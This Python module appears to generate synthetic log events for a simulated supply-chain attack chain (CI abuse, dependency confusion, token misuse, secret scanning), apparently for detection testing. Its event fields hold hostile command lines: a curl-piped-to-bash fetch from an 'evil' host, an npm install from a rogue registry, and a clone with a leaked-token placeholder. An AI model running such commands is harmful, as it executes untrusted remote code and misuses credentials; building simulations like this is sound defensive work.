import random
from typing import Any, Dict, List

from ..builder import build_base_event
from .common import _append_and_maybe_stop, _rand_hash, _shared_context


def supply_chain_dev_abuse_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Supply-chain and developer abuse across CI, deps, tokens, and secret scanning."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "ci_pipeline_abuse",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "action": "logged",
        },
    )
    evt1["process"] = {"name": "bash", "command_line": "curl -s https://raw.githubusercontent.com/evil/build/main/run.sh | bash"}
    evt1["user"] = {**evt1["user"], "name": "ci-runner"}
    evt1["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(180, 420),
        ctx,
        overrides={
            **shared,
            "category": "dependency_confusion",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "execution", "sequence": 2},
            "action": random.choice(["allowed", "blocked"]),
        },
    )
    evt2["process"] = {"name": random.choice(["npm", "pip"]), "command_line": "npm install internal-lib --registry http://registry.evil.local"}
    evt2["file"] = {"path": "/tmp/node_modules/internal-lib/package.json", "extension": "json", "hash": {"sha256": _rand_hash()}}
    evt2["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(900, 1500),
        ctx,
        overrides={
            **shared,
            "category": "github_pat_misuse",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "credential_access", "sequence": 3},
            "action": "blocked",
        },
    )
    evt3["process"] = {"name": "git", "command_line": "git clone https://ghp_leakedtoken@github.com/fusionai/private-repo.git"}
    evt3["authentication"] = {"method": "pat", "geo": random.choice(["UA", "IR", "CN"]), "new_device": True}
    evt3["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt3):
        return events

    evt4 = build_base_event(
        start_ts + random.randint(1500, 2400),
        ctx,
        overrides={
            **shared,
            "category": "secret_scan_block",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "discovery", "sequence": 4},
            "action": "blocked",
        },
    )
    evt4["process"] = {"name": "pre-commit", "command_line": "pre-commit run secrets --all-files"}
    evt4["file"] = {"path": "/builds/fusionai/app/.git/hooks/pre-commit", "extension": "", "hash": {"sha256": _rand_hash()}}
    evt4["network"]["direction"] = "internal"
    _append_and_maybe_stop(events, evt4)

    return events
